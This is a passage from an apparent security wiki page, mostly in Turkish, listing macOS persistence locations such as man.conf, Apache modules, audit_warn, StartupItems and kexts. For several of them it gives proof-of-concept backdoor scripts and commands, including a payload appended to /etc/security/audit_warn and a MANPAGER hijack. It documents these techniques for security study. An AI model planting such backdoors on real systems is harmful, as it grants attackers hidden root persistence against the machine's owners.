**`evaluate-mechanisms`**, authorization framework'üne **authorization için harici bir mechanism çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından yürütülmesini sağlar.

Şununla tetikleyin:
```bash
security authorize com.asdf.asdf
```
Ve ardından **staff group should have sudo** erişimine sahip olmalıdır (onaylamak için `/etc/sudoers` dosyasını okuyun).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve kullanıcının man kullanması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/private/etc/man.conf`**
- Root gerekir
- **`/private/etc/man.conf`**: man her kullanıldığında

#### Açıklama ve Exploit

**`/private/etc/man.conf`** yapılandırma dosyası, man dokümantasyon dosyaları açılırken kullanılacak binary/script'i belirtir. Bu nedenle executable yolu değiştirilebilir; böylece kullanıcı bazı dokümanları okumak için man kullandığında bir backdoor çalıştırılır.

Örneğin **`/private/etc/man.conf`** içinde şu şekilde ayarlayın:
```
MANPAGER /tmp/view
```
Ve ardından `/tmp/view` dosyasını şu şekilde oluşturun:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve apache'nin çalışıyor olması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd'nin entitlements'ı yok

#### Konum

- **`/etc/apache2/httpd.conf`**
- Root gerekir
- Tetikleyici: Apache2 başlatıldığında

#### Açıklama ve Exploit

`/etc/apache2/httpd.conf` dosyasına aşağıdakine benzer bir satır ekleyerek bir modül yüklenmesini belirtebilirsiniz:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken ya onu **geçerli bir Apple certificate ile sign etmek** ya da sisteme **yeni bir trusted certificate ekleyip** onunla **sign etmektir**.

Ardından, gerekirse sunucunun başlatılacağından emin olmak için şunu çalıştırabilirsiniz:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb için kod örneği:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/etc/security/audit_warn`**
- Root gerekir
- **Tetikleyici**: auditd bir uyarı algıladığında

#### Açıklama ve Exploit

auditd bir uyarı algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **This is deprecated, so nothing should be found in those directories.**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: Başlangıçta çalıştırılan bir shell script'i.
2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.

Başlangıç işleminin bunları tanıyıp kullanabilmesi için hem rc script'inin hem de `StartupParameters.plist` dosyasının **StartupItem** dizininin içine doğru şekilde yerleştirildiğinden emin olun.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Bu bileşeni macOS'umda bulamadım; daha fazla bilgi için writeup'a bakın

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple tarafından tanıtılan **emond**, az geliştirilmiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle faydalı olmasa da bu belirsiz servis, threat actor'lar için çoğu macOS admin'i tarafından fark edilmeyecek incelikli bir persistence yöntemi olarak kullanılabilir.

Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek oldukça kolaydır. Bu servisin sistemdeki LaunchDaemon'u, yürütülecek script'leri tek bir dizinde arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Konum

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root gereklidir
- **Tetikleyici**: XQuartz ile

#### Açıklama ve Exploit

XQuartz artık **macOS'ta kurulu olarak gelmiyor**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.

### ~~kext~~

> [!CAUTION]
> Root olarak bile kext kurmak o kadar karmaşıktır ki bir exploit'iniz olmadığı sürece bunu sandbox'lardan kaçmak veya persistence için değerlendirmeyeceğim.

#### Konum

Bir KEXT'yi startup item olarak kurmak için **aşağıdaki konumlardan birine kurulması gerekir**:

- `/System/Library/Extensions`
- OS X işletim sistemine yerleşik KEXT dosyaları.
- `/Library/Extensions`
- 3rd party software tarafından kurulan KEXT dosyaları

Şu anda yüklenmiş kext dosyalarını şu komutla listeleyebilirsiniz:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Daha fazla bilgi için [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Konum

- **`/usr/local/bin/amstoold`**
- Root gerekli

#### Açıklama ve Exploitation

Görünüşe göre `/System/Library/LaunchAgents/com.apple.amstoold.plist` içindeki `plist`, bir XPC service sunarken bu binary'yi kullanıyordu... Ancak binary mevcut değildi; bu nedenle oraya bir şey yerleştirebilir ve XPC service çağrıldığında binary'nizin çalıştırılmasını sağlayabilirdiniz.

Artık bunu macOS'umda bulamıyorum.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Konum

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root gerekli
- **Trigger**: Service çalıştırıldığında (nadiren)

#### Açıklama ve exploit

Görünüşe göre bu script'i çalıştırmak pek yaygın değil ve macOS'umda bile bulamadım; bu nedenle daha fazla bilgi istiyorsanız writeup'a göz atın.

### ~~/etc/rc.common~~

> [!CAUTION] > **Bu, modern MacOS sürümlerinde çalışmıyor**

Buraya **başlangıçta çalıştırılacak komutlar** yerleştirmek de mümkündür. Örneğin normal bir rc.common script'i:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence teknikleri ve araçları

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referanslar

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
